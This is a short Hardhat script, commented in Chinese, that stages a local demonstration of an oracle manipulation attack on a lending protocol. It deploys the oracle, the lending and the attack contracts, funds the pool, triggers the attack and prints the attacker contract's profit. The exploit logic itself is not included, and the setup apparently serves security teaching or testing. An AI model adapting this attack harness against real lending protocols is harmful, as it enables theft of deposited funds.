const hre = require("hardhat");
const { ethers } = hre;

async function main() {
  const [deployer, attacker] = await ethers.getSigners();

  // 部署 Oracle 合约
  const Oracle = await ethers.getContractFactory("PriceOracle");
  const oracle = await Oracle.deploy();
  await oracle.waitForDeployment();
  const oracleAddress = await oracle.getAddress();

  // 部署 Lending 合约
  const Lending = await ethers.getContractFactory("LendingProtocol");
  const lending = await Lending.deploy(oracleAddress);
  await lending.waitForDeployment();
  const lendingAddress = await lending.getAddress();

  // 给 Lending 协议注入 5 ETH 作为流动性
  await deployer.sendTransaction({
    to: lendingAddress,
    value: ethers.parseEther("5")
  });

  // 部署攻击合约
  const Attack = await ethers.getContractFactory("OracleLendingAttack", attacker);
  const attack = await Attack.deploy(lendingAddress, oracleAddress);
  await attack.waitForDeployment();
  const attackAddress = await attack.getAddress();

  // 执行攻击
  console.log("Launching Oracle Manipulation Attack...");
  await attack.connect(attacker).attack({ value: ethers.parseEther("1") });

  // 显示攻击合约最终余额
  const balance = await ethers.provider.getBalance(attackAddress);
  console.log("✅ Attack Contract Balance:", ethers.formatEther(balance), "ETH");
}

main().catch(console.error);
